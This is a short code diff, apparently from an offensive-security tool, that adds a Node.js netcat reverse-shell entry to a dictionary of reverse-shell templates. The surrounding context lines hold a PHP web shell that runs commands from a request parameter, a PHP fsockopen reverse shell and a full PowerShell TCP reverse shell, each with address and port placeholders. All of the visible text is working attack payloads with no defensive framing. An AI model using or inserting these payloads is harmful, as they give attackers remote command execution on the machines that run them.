@@ -9,6 +9,7 @@ REV_SHELL_TEMPLATES = {
     "php cmd": "<?php if(isset($_REQUEST[\"cmd\"])){{ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }}?>",
     "php exec": "php -r '$sock=fsockopen(\"{address}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
     "powershell": "$LHOST = \"{address}\"; $LPORT = ${port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
+    "javascript": "require('child_process').exec('nc -e /bin/bash {address} {port}')"
 }
 
 
